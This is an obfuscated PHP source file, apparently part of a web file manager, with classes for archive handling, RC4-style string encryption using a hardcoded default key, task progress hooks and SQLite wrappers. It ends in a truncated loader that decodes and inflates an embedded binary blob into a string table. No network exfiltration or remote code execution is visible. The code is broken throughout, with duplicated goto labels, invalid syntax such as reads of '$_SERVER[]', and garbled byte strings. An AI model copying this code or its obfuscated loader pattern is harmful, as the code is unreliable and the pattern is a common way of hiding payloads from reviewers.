@rename($c, $Dª); return $Dª; goto FƜ; e̍: $a =& $_SERVER[]; self::init(); $Eݖ = TEMP_FILES . hash_path($B߬ү) . $a[8]; goto e˦; C߷: if (file_exists($Dª)) { return $Dª; } $D = new PclZip($B߬ү); $c = unzip_filter_ext($Eݖ . get_path_this($Cרʍ)); goto F֝; FƜ: } static function filePreview($EꞒŸ, $B, $Fʔ = false, $e놆 = false) { goto Cʯ; FК: mk_dir($dŅ); $b = $dŅ . md5($EꞒŸ . $B . $e놆); $c˪ = $c[33]; goto b; fǼ߃: if (!$A挓[$c[1019]]) { show_json($A挓[$c[1021]], !1); } if (!file_exists($d)) { show_json($c[1892], !1); } @rename($d, $b); goto eƦţ; b: $A挓 = self::extract($EꞒŸ, $dŅ, $B, $c˪); if (is_array($c˪)) { show_json($c[1891], !1); } if (file_exists($b)) { IO::fileOut($b, $Fʔ, get_path_this($c˪)); return; } goto FȉŐ; Cʯ: $c =& $_SERVER[]; self::init(); $dŅ = TEMP_FILES . hash_path($EꞒŸ) . $c[8]; goto FК; FȉŐ: $c˪ = unzip_pre_name($c˪); $B = get_path_this($c˪); $d = unzip_filter_ext($dŅ . $B); goto fǼ߃; eƦţ: if (!file_exists($b)) { del_dir($dŅ); show_json($c[1893]); } IO::fileOut($b, $Fʔ, $B); goto c;; c;: } static function create($Dϸž, $a㲇) { $b΋ =& $_SERVER[]; self::init(); $cƆГ = get_path_ext($Dϸž); $Fȯ = !1; if (self::checkIfType($cƆГ, $b΋[297])) { if (kodZipArchive::support($b΋[997])) { return kodZipArchive::create($Dϸž, $a㲇); } $b = new PclZip($Dϸž); foreach ($a㲇 as $A❞ => $cŘ) { $cŘ = str_replace($b΋[463], $b΋[8], $cŘ); $a = Kodio::clear(get_path_father($cŘ)); if ($A❞ == 0) { $Fȯ = $b->create($cŘ, PCLZIP_OPT_REMOVE_PATH, $a, PCLZIP_CB_PRE_FILE_NAME, $b΋[1894]); continue; } $Fȯ = $b->add($cŘ, PCLZIP_OPT_REMOVE_PATH, $a, PCLZIP_CB_PRE_FILE_NAME, $b΋[1894]); } } else { if (self::checkIfType($cƆГ, $b΋[1865])) { foreach ($a㲇 as $A❞ => $cŘ) { $cŘ = str_replace($b΋[463], $b΋[8], $cŘ); $a = Kodio::clear(get_path_father($cŘ)); if ($A❞ == 0) { $Fȯ = PclTarCreate($Dϸž, array($cŘ), $cƆГ, null, $a); continue; } $Fȯ = PclTarAddList($Dϸž, array($cŘ), $b΋[33], $a, $cƆГ); } } } return $Fȯ; } } class Mcrypt { public static $defaultKey = "\x61\x21\x74\x61\x6b\101\x3a\144\x6c\155\x63\154\144\x45\x76\x2c\145"; public static function encode($EԪ, $DȜ孴 = '', $E̅ = 0, $a畩ۡ = '') { goto bְ; Cن: for ($aɇ = 0; $aɇ <= 255; $aɇ++) { $Cٵ˪[$aɇ] = ord($f[$aɇ % $bۓ]); } $a擊 = range(0, 255); for ($D둇η = $aɇ = 0; $aɇ < 256; $aɇ++) { $D둇η = ($D둇η + $a擊[$aɇ] + $Cٵ˪[$aɇ]) % 256; $e򧯠 = $a擊[$aɇ]; $a擊[$aɇ] = $a擊[$D둇η]; $a擊[$D둇η] = $e򧯠; } goto d; E: $EԪ = sprintf($Aݥ۽[1895], $E̅ ? $E̅ + time() : 0) . substr(md5($EԪ . $C㈣), 0, 16) . $EԪ; $f׳ = strlen($EԪ); $Cٵ˪ = array(); goto Cن; bߊ: $E񣙽 = str_replace(array($Aݥ۽[280], $Aݥ۽[8], $Aݥ۽[893]), array($Aݥ۽[408], $Aݥ۽[70], $Aݥ۽[91]), $E񣙽); return $E񣙽; goto Fˢ; bְ: $Aݥ۽ =& $_SERVER[]; $fҠ = 4; $DȜ孴 = md5($DȜ孴 ? $DȜ孴 : self::$defaultKey); goto f; f: $FɆ = md5(substr($DȜ孴, 0, 16)); $C㈣ = md5(substr($DȜ孴, 16, 16)); $a畩ۡ = $a畩ۡ ? $a畩ۡ : md5(microtime()); goto f; f: $eʹ = substr($a畩ۡ, -$fҠ); $f = $FɆ . md5($FɆ . $eʹ); $bۓ = strlen($f); goto E; d: $E񣙽 = $Aݥ۽[33]; for ($a = $D둇η = $aɇ = 0; $aɇ < $f׳; $aɇ++) { $a = ($a + 1) % 256; $D둇η = ($D둇η + $a擊[$a]) % 256; $e򧯠 = $a擊[$a]; $a擊[$a] = $a擊[$D둇η]; $a擊[$D둇η] = $e򧯠; $E񣙽 .= chr(ord($EԪ[$aɇ]) ^ $a擊[($a擊[$a] + $a擊[$D둇η]) % 256]); } $E񣙽 = $eʹ . str_replace($Aݥ۽[893], $Aݥ۽[33], base64_encode($E񣙽)); goto bߊ; Fˢ: } public static function decode($D屣, $Dۉ = '') { goto cЋӻ; A: $Dۉ = md5($Dۉ ? $Dۉ : self::$defaultKey); $Dʳ = md5(substr($Dۉ, 0, 16)); $eщŏސ = md5(substr($Dۉ, 16, 16)); goto FĤ; FĤ: $F = substr($D屣, 0, $F); $Cé = $Dʳ . md5($Dʳ . $F); $C = strlen($Cé); goto b; eþ돥: if (($fΰݦ == 0 || $fΰݦ - time() > 0) && substr($bն͆, 10, 16) == substr(md5(substr($bն͆, 26) . $eщŏސ), 0, 16)) { return substr($bն͆, 26); } else { return $b頴[33]; } goto aל; b: $D屣 = base64_decode(substr($D屣, $F)); $Cٷ = strlen($D屣); $Dˈ = array(); goto Bٖ; cЋӻ: $b頴 =& $_SERVER[]; $D屣 = str_replace(array($b頴[408], $b頴[70], $b頴[91]), array($b頴[280], $b頴[8], $b頴[893]), $D屣); $F = 4; goto A; Fޓʍ: $bն͆ = $b頴[33]; for ($A۰ = $eٮ = $Fߵڢݴ = 0; $Fߵڢݴ < $Cٷ; $Fߵڢݴ++) { $A۰ = ($A۰ + 1) % 256; $eٮ = ($eٮ + $eӱ[$A۰]) % 256; $D϶ = $eӱ[$A۰]; $eӱ[$A۰] = $eӱ[$eٮ]; $eӱ[$eٮ] = $D϶; $bն͆ .= chr(ord($D屣[$Fߵڢݴ]) ^ $eӱ[($eӱ[$A۰] + $eӱ[$eٮ]) % 256]); } $fΰݦ = intval(substr($bն͆, 0, 10)); goto eþ돥; Bٖ: for ($Fߵڢݴ = 0; $Fߵڢݴ <= 255; $Fߵڢݴ++) { $Dˈ[$Fߵڢݴ] = ord($Cé[$Fߵڢݴ % $C]); } $eӱ = range(0, 255); for ($eٮ = $Fߵڢݴ = 0; $Fߵڢݴ < 256; $Fߵڢݴ++) { $eٮ = ($eٮ + $eӱ[$Fߵڢݴ] + $Dˈ[$Fߵڢݴ]) % 256; $D϶ = $eӱ[$Fߵڢݴ]; $eӱ[$Fߵڢݴ] = $eӱ[$eٮ]; $eӱ[$eٮ] = $D϶; } goto Fޓʍ; aל: } } goto d; D: class TaskHttp extends Task { protected function startAfter() { $F¿ =& $_SERVER[]; Hook::bind($F¿[1443], array($this, $F¿[1466])); Hook::bind($F¿[1445], array($this, $F¿[1467])); Hook::bind($F¿[1447], array($this, $F¿[1468])); } protected function endAfter() { $E =& $_SERVER[]; Hook::unbind($E[1443], array($this, $E[1466])); Hook::unbind($E[1445], array($this, $E[1467])); Hook::unbind($E[1447], array($this, $E[1468])); } public function progressStart($B䮡) { $A؅ =& $_SERVER[]; $E = curl_getinfo($B䮡); self::log($A؅[1469] . $E[$A؅[291]]); self::valueSet($this->task[$A؅[363]], $this->task); } public function progressEnd($A֝㹅) { $E΅ =& $_SERVER[]; self::log($E΅[1470] . $this->task[$E΅[363]]); $this->end(); } public function progress($c, $aם, $d빭, $dܨٷ, $d҂) { $Fꗤ =& $_SERVER[]; $B =& $this->task; if ($d҂ > 0) { $B[$Fꗤ[965]] = $B[$Fꗤ[965]] == 0 ? $dܨٷ : $B[$Fꗤ[965]]; $B[$Fꗤ[977]] = $d҂; } else { if ($d빭 > 0) { $B[$Fꗤ[965]] = $B[$Fꗤ[965]] == 0 ? $aם : $B[$Fꗤ[965]]; $B[$Fꗤ[977]] = $d빭; } } $this->update(); self::log("\160\162\x6f\x67\x72\145\163\163\x48\x74\x74\160\x3a\144\x6f\x77\x6e\x3a{$d빭}\x2f{$aם}\x3b\40\x75\x70\x6c\157\x61\144\x3a{$d҂}\57{$dܨٷ}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto c; c: $dׅ =& $_SERVER[]; parent::startAfter(); Hook::bind($dׅ[1471], array($this, $dׅ[1472])); goto bڅ; bڅ: Hook::bind($dׅ[1022], array($this, $dׅ[1473])); $bʠ =& $this->task; $bʠ[$dׅ[1474]] = $dׅ[1027]; goto e轶; e轶: if (!$bʠ[$dׅ[1313]]) { $bʠ[$dׅ[1313]] = LNG($dׅ[1475]); } goto C׍; C׍: } protected function endAfter() { $e܆ =& $_SERVER[]; parent::endAfter(); Hook::unbind($e܆[1471], array($this, $e܆[1472])); Hook::unbind($e܆[1022], array($this, $e܆[1473])); } public function updateAfter() { $aׇʎ =& $_SERVER[]; $A =& $this->task; if (!$A[$aׇʎ[965]] || !$A[$aׇʎ[684]]) { return; } if ($A[$aׇʎ[1474]] == $aׇʎ[1027]) { $F͖٠ = 0; if ($A[$aׇʎ[1451]]) { $F͖٠ = $A[$aׇʎ[1452]] / $A[$aׇʎ[1451]]; } $A[$aׇʎ[1407]] = $F͖٠ * 0.3; } else { if ($A[$aׇʎ[1474]] == $aׇʎ[297]) { $F͖٠ = $A[$aׇʎ[977]] / $A[$aׇʎ[965]]; $A[$aׇʎ[1407]] = 0.3 + $F͖٠ * 0.4; } else { if ($A[$aׇʎ[1474]] == $aׇʎ[102]) { $fڨŕ = 0; if ($A[$aׇʎ[1453]] == $aׇʎ[102]) { $fڨŕ = $A[$aׇʎ[1452]]; } $F͖٠ = ($A[$aׇʎ[1456]] + $fڨŕ) / $A[$aׇʎ[684]]; $A[$aׇʎ[1407]] = 0.3 + 0.4 + $F͖٠ * 0.3; } } } if ($A[$aׇʎ[1407]] > 0) { $Bƽ = timeFloat() - $A[$aׇʎ[1409]] - $A[$aׇʎ[1412]]; $A[$aׇʎ[1413]] = $Bƽ * (1 - $A[$aׇʎ[1407]]) / $A[$aׇʎ[1407]]; } } public function addFile($b) { goto a; a: $Cك =& $_SERVER[]; $a =& $this->task; $cĿڅ = IO::info($b); goto b; e: $a[$Cك[967]] = $Cك[1464]; $a[$Cك[1453]] = $Cك[1027]; $a[$Cك[684]] = $cĿڅ[$Cك[77]]; goto B˧; B˧: $a[$Cك[965]] = 1; $cԞȓ = 0; $a[$Cك[1457]] = array($Cك[1458] => $cԞȓ + 1, $Cك[382] => $cĿڅ[$Cك[28]], $Cك[75] => $cĿڅ[$Cك[75]], $Cك[462] => $cĿڅ[$Cك[462]] ? $cĿڅ[$Cك[462]] : $cĿڅ[$Cك[75]]); goto fә; b: $a[$Cك[1449]] = $cĿڅ[$Cك[28]]; $a[$Cك[1451]] = $cĿڅ[$Cك[77]]; $a[$Cك[1452]] = 0; goto e; fә: $this->update(); goto B; B: } public function unzipAfter($B֌) { goto aƿ̢; D: $b忐[$b[977]] = 0; $b忐[$b[1451]] = 0; $b忐[$b[1452]] = 0; goto ě; F: $Bƽ = IO::infoWithChildren($B֌); $EԒ = 0; $b忐[$b[1457]] = array($b[1458] => $EԒ + 1, $b[382] => $Bƽ[$b[28]], $b[75] => $Bƽ[$b[75]], $b[462] => $Bƽ[$b[462]] ? $Bƽ[$b[462]] : $Bƽ[$b[75]]); goto Dȣ; ě: $b忐[$b[1449]] = $b[33]; $b忐[$b[1456]] = 0; $b忐[$b[684]] = $Bƽ[$b[77]]; goto aՇ; aƿ̢: $b =& $_SERVER[]; $b忐 =& $this->task; $b忐[$b[1474]] = $b[102]; goto F; Dȣ: if ($Bƽ[$b[29]] == $b[163]) { $b忐[$b[965]] = 1; } else { $b忐[$b[965]] = $Bƽ[$b[80]][$b[78]]; } $b忐[$b[967]] = $b[33]; $b忐[$b[1453]] = 0; goto D; aՇ: $this->update(); self::log($b[1476] . json_encode(array($b忐, $Bƽ))); goto BǑ; BǑ: } public function nameParse($eԤ) { goto E; E: $bӈ =& $_SERVER[]; $DĆǓ =& $this->task; if ($DĆǓ[$bӈ[1474]] == $bӈ[1027]) { $DĆǓ[$bӈ[1474]] = $bӈ[297]; $DĆǓ[$bӈ[1456]] = 0; $DĆǓ[$bӈ[684]] = 0; } goto aȤ; A֔ڻ: $this->update(); goto BҌ֡; aȤ: $Eܣ = get_path_this($eԤ); if (strstr($Eܣ, $bӈ[91])) { $DĆǓ[$bӈ[977]] += 1; $DĆǓ[$bӈ[965]] += 1; } $DĆǓ[$bӈ[1449]] = $eԤ; goto A֔ڻ; BҌ֡: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $A =& $_SERVER[]; parent::startAfter(); Hook::bind($A[1477], array($this, $A[1472])); $A =& $this->task; $A[$A[1474]] = $A[1027]; if (!$A[$A[1313]]) { $A[$A[1313]] = LNG($A[1478]); } } protected function endAfter() { $E߿ =& $_SERVER[]; parent::endAfter(); Hook::unbind($E߿[1477], array($this, $E߿[1472])); } public function updateAfter() { $BΓ =& $_SERVER[]; $cѯƟ =& $this->task; if (!$cѯƟ[$BΓ[965]] || !$cѯƟ[$BΓ[684]]) { return; } if ($cѯƟ[$BΓ[1474]] == $BΓ[1027]) { $e = $cѯƟ[$BΓ[1452]]; if ($cѯƟ[$BΓ[1453]] != $BΓ[1027]) { $e = 0; } $A؜ = ($cѯƟ[$BΓ[1456]] + $e) / $cѯƟ[$BΓ[684]]; $cѯƟ[$BΓ[1407]] = $A؜ * 0.3; } else { if ($cѯƟ[$BΓ[1474]] == $BΓ[297]) { $A؜ = $cѯƟ[$BΓ[977]] / $cѯƟ[$BΓ[965]]; $cѯƟ[$BΓ[1407]] = 0.3 + $A؜ * 0.5; } else { if ($cѯƟ[$BΓ[1474]] == $BΓ[102]) { $A؜ = 0; if ($cѯƟ[$BΓ[1451]]) { $A؜ = $cѯƟ[$BΓ[1452]] / $cѯƟ[$BΓ[1451]]; } $cѯƟ[$BΓ[1407]] = 0.3 + 0.5 + $A؜ * 0.2; } } } if ($cѯƟ[$BΓ[1407]] > 0) { $CƐՒ = timeFloat() - $cѯƟ[$BΓ[1409]] - $cѯƟ[$BΓ[1412]]; $cѯƟ[$BΓ[1413]] = $CƐՒ * (1 - $cѯƟ[$BΓ[1407]]) / $cѯƟ[$BΓ[1407]]; } } public function copyFileStart($F, $Bԣ, $a扄܎, $f, $aڌ, $Cܖ) { $b頋 =& $_SERVER[]; parent::copyFileStart($F, $Bԣ, $a扄܎, $f, $aڌ, $Cܖ); $A =& $this->task; if ($A[$b頋[1474]] == $b頋[297]) { $A[$b頋[1474]] = $b頋[102]; } $this->update(); } public function copyFileEnd($DС, $DӖϛ, $A, $C, $a܎, $d͎) { $a =& $_SERVER[]; $bßѺ =& $this->task; $bßѺ[$a[1452]] = $bßѺ[$a[1451]]; $bßѺ[$a[1456]] += $bßѺ[$a[1451]]; $bßѺ[$a[1453]] = $a[33]; $this->update(); } public function nameParse($A酋) { $D鸽 =& $_SERVER[]; $cȢɍ =& $this->task; if ($cȢɍ[$D鸽[977]] < $cȢɍ[$D鸽[965]]) { $cۍ = get_path_this($A酋); if (strstr($cۍ, $D鸽[91])) { $cȢɍ[$D鸽[977]] += 1; } } if ($cȢɍ[$D鸽[1474]] == $D鸽[1027]) { $cȢɍ[$D鸽[1474]] = $D鸽[297]; } $cȢɍ[$D鸽[1449]] = $A酋; $this->update(); } } goto Aٜ; c鹊: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto d; c׎: $this->in =& $in; $this->values[$C[6]] =& $config; $this->values[$C[7]] =& $in; goto b΍; d: $C =& $_SERVER[]; global $in, $config; $this->config =& $config; goto c׎; b΍: $this->tpl = TEMPLATE . MOD . $C[8]; $this->_classObjectID = mt_rand(0, 10000); goto f; f: } public function loadClass($DדĐ) { if (1 === func_num_args()) { $this->{$DדĐ} = new $DדĐ(); } else { $eޛ = new ReflectionClass($DדĐ); $cݙ嘍 = func_get_args(); array_shift($cݙ嘍); $this->{$DדĐ} = $eޛ->newInstanceArgs($cݙ嘍); } return $this->{$DדĐ}; } protected function assign($C̎, $dꌾ) { $this->values[$C̎] = $dꌾ; } protected function display($Cڢ) { ob_end_clean(); extract($this->values); require $this->tpl . $Cڢ; } } class DbSqliteBase extends Db { public function __construct($Cᤔ = '') { $c܎ =& $_SERVER[]; if (!extension_loaded($c܎[9])) { think_exception(think_lang($c܎[10]) . $c܎[11]); } if (!empty($Cᤔ)) { if (!isset($Cᤔ[$c܎[12]])) { $Cᤔ[$c܎[12]] = 438; } $this->config = $Cᤔ; if (empty($this->config[$c܎[13]])) { $this->config[$c܎[13]] = array(); } } } public function connect($c = '', $c̬õ = 0) { $d· =& $_SERVER[]; if (!isset($this->linkID[$c̬õ])) { goto e; C: $this->linkID[$c̬õ] = $B귴($c[$d·[17]], $c[$d·[12]]); if (!$this->linkID[$c̬õ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto e; e: if (empty($c)) { $c = $this->config; } $CЋ = !empty($c[$d·[13]][$d·[14]]) ? $c[$d·[13]][$d·[14]] : $this->pconnect; $B귴 = $CЋ ? $d·[15] : $d·[16]; goto C; e: @sqlite_busy_timeout($this->linkID[$c̬õ], 30000); if (1 != think_config($d·[18])) { unset($this->config); } goto b; b: } return $this->linkID[$c̬õ]; } public function free() { $this->queryID = null; } public function query($Dֱ) { goto eސ; bՆԽ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $fÿו = $this->getAll(); return $fÿו; } goto Cۇӹۂ; c҇跧: think_status($A[20]); $this->queryID = sqlite_query($this->_linkID, $Dֱ); $this->debug(); goto bՆԽ; eސ: $A =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c; c: $this->queryStr = $Dֱ; if ($this->queryID) { $this->free(); } think_action_status($A[19], 1); goto c҇跧; Cۇӹۂ: } public function execute($e׬) { goto EŐڑ; EƬ: think_status($E٧[20]); $D = sqlite_exec($this->_linkID, $e׬); $this->debug(); goto bҎ; EŐڑ: $E٧ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bˢ; bҎ: if (!1 === $D) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Dՙ; bˢ: $this->queryStr = $e׬; if ($this->queryID) { $this->free(); } think_action_status($E٧[21], 1); goto EƬ; Dՙ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d = sqlite_query($this->_linkID, $_SERVER[][23]); if (!$d) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BΝ = sqlite_query($this->_linkID, $_SERVER[][24]); if (!$BΝ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Aͣ = array(); if ($this->numRows > 0) { for ($D뚮 = 0; $D뚮 < $this->numRows; $D뚮++) { $Aͣ[$D뚮] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Aͣ; } public function getFields($cϻ̱) { $f葏 =& $_SERVER[]; $EњĎ = $this->query($f葏[25] . $cϻ̱ . $f葏[26]); $F鿟 = array(); if ($EњĎ) { foreach ($EњĎ as $bȘ => $b킭ߠ) { $F鿟[$b킭ߠ[$f葏[27]]] = array($f葏[28] => $b킭ߠ[$f葏[27]], $f葏[29] => $b킭ߠ[$f葏[30]], $f葏[31] => (bool) ($b킭ߠ[$f葏[32]] === $f葏[33]), $f葏[34] => $b킭ߠ[$f葏[35]], $f葏[36] => strtolower($b킭ߠ[$f葏[37]]) == $f葏[38], $f葏[39] => strtolower($b킭ߠ[$f葏[40]]) == $f葏[41]); } } return $F鿟; } public function getTables($b = '') { $dԑװ =& $_SERVER[]; $CФܤ׃ = $this->query($dԑװ[42] . $dԑװ[43] . $dԑװ[44]); $bƢ⌂ = array(); foreach ($CФܤ׃ as $b甲 => $c) { $bƢ⌂[$b甲] = current($c); } return $bƢ⌂; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $E۩ѹ =& $_SERVER[]; $dμ = sqlite_last_error($this->_linkID); $this->error = $dμ . $E۩ѹ[4] . sqlite_error_string($dμ); if ($E۩ѹ[33] != $this->queryStr) { $this->error .= LNG($E۩ѹ[45]) . $this->queryStr; } think_trace($this->error, $E۩ѹ[33], $E۩ѹ[46]); return $this->error; } public function escapeString($d贈) { return sqlite_escape_string($d贈); } public function parseLimit($bÅ) { $fܖ =& $_SERVER[]; $c͙ = $fܖ[33]; if (!empty($bÅ)) { $bÅ = explode($fܖ[47], $bÅ); if (count($bÅ) > 1) { $c͙ .= $fܖ[48] . $bÅ[1] . $fܖ[49] . $bÅ[0] . $fܖ[50]; } else { $c͙ .= $fܖ[48] . $bÅ[0] . $fܖ[50]; } } return $c͙; } } class DbSqlite3Base extends Db { public function __construct($Bͭ = '') { $d =& $_SERVER[]; if (!class_exists($d[51])) { think_exception(think_lang($d[10]) . $d[52]); } if (!empty($Bͭ)) { if (!isset($Bͭ[$d[12]])) { $Bͭ[$d[12]] = 438; } $this->config = $Bͭ; if (empty($this->config[$d[13]])) { $this->config[$d[13]] = array(); } } } public function connect($e± = '', $Bﲕ؞ = 0) { $Fÿ =& $_SERVER[]; if (!isset($this->linkID[$Bﲕ؞])) { if (empty($e±)) { $e± = $this->config; } $this->linkID[$Bﲕ؞] = new SQLite3($e±[$Fÿ[17]]); if (!$this->linkID[$Bﲕ؞]) { think_exception($this->linkID[$Bﲕ؞]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Bﲕ؞]->busyTimeout(30000); if (1 != think_config($Fÿ[18])) { unset($this->config); } } return $this->linkID[$Bﲕ؞]; } public function free() { $this->queryID = null; } public function query($Fᶄ) { goto aг; aг: $eŇ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E; E: $this->queryStr = $Fᶄ; if ($this->queryID) { $this->free(); } think_action_status($eŇ[19], 1); goto a; e겉: if (!1 === $this->queryID) { $this->error(); return !1; } else { $B = $this->getAll(); $this->numRows = count($B); return $B; } goto A߿; a: think_status($eŇ[20]); $this->queryID = $this->_linkID->query($Fᶄ); $this->debug(); goto e겉; A߿: } public function execute($fՊ) { goto aâ͋; aâ͋: $d鹤 =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fė; E: if (!1 === $C) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Cҙ׉; Fė: $this->queryStr = $fՊ; if ($this->queryID) { $this->free(); } think_action_status($d鹤[21], 1); goto D̞; D̞: think_status($d鹤[20]); $C = $this->_linkID->exec($fՊ); $this->debug(); goto E; Cҙ׉: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Aʽ = $this->_linkID->query($_SERVER[][23]); if (!$Aʽ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $bͫĿ = $this->_linkID->query($_SERVER[][24]); if (!$bͫĿ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C᫓ = array(); while ($fƘ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $C᫓[] = $fƘ; } $this->queryID->reset(); return $C᫓; } public function getFields($BݦԤ) { $dȌ =& $_SERVER[]; $Bս = $this->query($dȌ[25] . $BݦԤ . $dȌ[26]); $EԢ = array(); if ($Bս) { foreach ($Bս as $aت => $f) { $EԢ[$f[$dȌ[28]]] = array($dȌ[28] => $f[$dȌ[28]], $dȌ[29] => $f[$dȌ[29]], $dȌ[31] => (bool) ($f[$dȌ[31]] === $dȌ[33]), $dȌ[34] => $f[$dȌ[53]], $dȌ[36] => (bool) $f[$dȌ[54]], $dȌ[39] => (bool) $f[$dȌ[54]]); } } return $EԢ; } public function getTables($b߆ = '') { $E =& $_SERVER[]; $f隙 = $this->query($E[42] . $E[43] . $E[44]); $B॓ = array(); foreach ($f隙 as $Fʰ => $e̻ӌ) { $B॓[$Fʰ] = current($e̻ӌ); } return $B॓; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $c =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($c[33] != $this->queryStr) { $this->error .= LNG($c[45]) . $this->queryStr; } think_trace($this->error, $c[33], $c[46]); return $this->error; } public function escapeString($c) { $b˨é؄ =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($c); } return str_ireplace($b˨é؄[55], $b˨é؄[56], $c); } public function parseLimit($D탕ތ) { $dߎއ =& $_SERVER[]; $dߡ = $dߎއ[33]; if (!empty($D탕ތ)) { $D탕ތ = explode($dߎއ[47], $D탕ތ); if (count($D탕ތ) > 1) { $dߡ .= $dߎއ[48] . $D탕ތ[1] . $dߎއ[49] . $D탕ތ[0] . $dߎއ[50]; } else { $dߡ .= $dߎއ[48] . $D탕ތ[0] . $dߎއ[50]; } } return $dߡ; } } goto AԫӘ; C폊Ř: define($_SERVER[][223], 2); define($_SERVER[][224], 3); define($_SERVER[][225], 1); goto DÖ; AŤ: function beforeShutdown() { Hook::trigger($_SERVER[][36]); } $_SERVER[$_SERVER[][37]] = BASIC_PATH; $_SERVER[$_SERVER[][38]] = LIB_DIR; goto FǙ; dŷ: if (!function_exists('_kodDe')) { function _kodDe($eگ) { $eگ = base64_decode($eگ); $e = strlen($eگ); $F = ''; $D = ord($eگ[0]) - 30; for ($dᗂ = 1; $dᗂ < $e; $dᗂ += 2) { if ($dᗂ + 1 < $e) { $F .= chr(ord($eگ[$dᗂ + 1]) + $D); $F .= chr(ord($eگ[$dᗂ]) + $D); } else { $F .= chr(ord($eگ[$dᗂ]) + $D); } } return $F; } } define("\242\231\267\250", "\xad\x94\x90"); $_SERVER[] = explode(base64_decode('fAF8BXwD'), gzinflate(substr(strrev('n[ۻq:,\'I\'I>Ill"c-0|}'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'').base64_decode('tLunZpmEZjBgOgmYktAh9BB6DyWU0Ak9dNuUhJqEGvJNn9m9EyQfP+SbefNmdsqbN29m3nvz2NQ=')."\xf6\x53\x3f\x9a\xda\xf1\xa2\x7b\x5f\xfe\xcb\xe9\xe7\xe0\xf0\xd4\x4e\xe0\xdf\x9d\x70\xf8\x90\x93\x76\xd9\xe\xfd\xb7\x63\x7e\xc5\xfd\x3d\x3b\xd4\xed\x75\xf7\x9b\xf\x5d\xff\xe6\xbb\x8f\x2e\x7b\xfb\x82\x3\xf7\x3a\x6b\xfe\x63".base64_decode('e//6tmxw87N75NrU82752ca33hk8d/Xo7Fjjx5d9nn79zze0bSsU37trzYyfXnRD+toFJ8w+deo=').base64_decode('oR2lD5PvyYU7Xqs6Zvz1P752+4VzDzpjMPLFLh/u3fr5Xpv/8LvMP1YOf/Lv/1z75GeHhx76IB0=')."\x3f\x6b\x7c\xd3\xf6\x77\xdd\xfa\xf3\x43\xef\x59\x78\xe0\x8f\x67\xed\xf9\xe6\xba\xc7\xba\x5e\x7a\xce\x7b\xc0\xe\xad\xab\x5e\x72\x1f\x78\xf8\x8c\x1f\x65\x9f\x58\xbb\xe7\xe\x13\xb7\x7e\xd4\xbf\xf1\xbb\xa9\xbd\xbc\x89\x59\xcb".strrev('2z\\͗y\'|Ϊxp>/__v>_W')."\160\352\206\325\237\335\267\365\201\207\366\375\152\171\175\342\235\167\167\177\64\331\27\36\253\174\342\347\306\107\233\352\255\247\134\223\263\37\371\360\317\35\263\37\171\344\300\363\167\276\377\260\323\276\30\330"."\xed\xe4\xeb\xcf\xde\xf0\xdc\xea\x6f\xee\x3a\x79\xe5\x80\xe7\xbc\x63\xa6\x3c\x17\xec\x33\xf6\xf1\x51\xdb\xe\x39\xe6\x96\x39\x91\x96\x82\x7a\xf4\xaf\x6e\xdc\xee\xc6\x57\x6e\xda\xee\x80\xb3\xe7\x5f\xf3\x66\xc7\xca\x6d\xf7\x5e"."\272\370\224\347\367\136\160\360\336\257\74\362\302\341\112\150\237\35\336\330\162\317\357\147\66\7\176\261\375\231\57\17\36\377\306\16\333\155\207\73\272\21\377\110\232\156\111\312\270\152\132\46\6\44\165\55"."\xad\x66\x70\x58\xd5\xf0\xaf\x17\xff\x98\x23\x39\xd5\x52\x70\x38\xde\x13\x8a\xc6\x23\x7d\xbd\xbd\xfe\x70\x34\x4e\x4a\x14\xd3\xf3\x7a\x8a\x84\xa\xb2\x21\xe7\x49\xe1\x5\xc5\x30\xc1\xa7\xc4\xe2\xe2\x5\xbd\xa0\x68\x36\x8\x7".strrev('4R=;zf1+'."\r".'`*)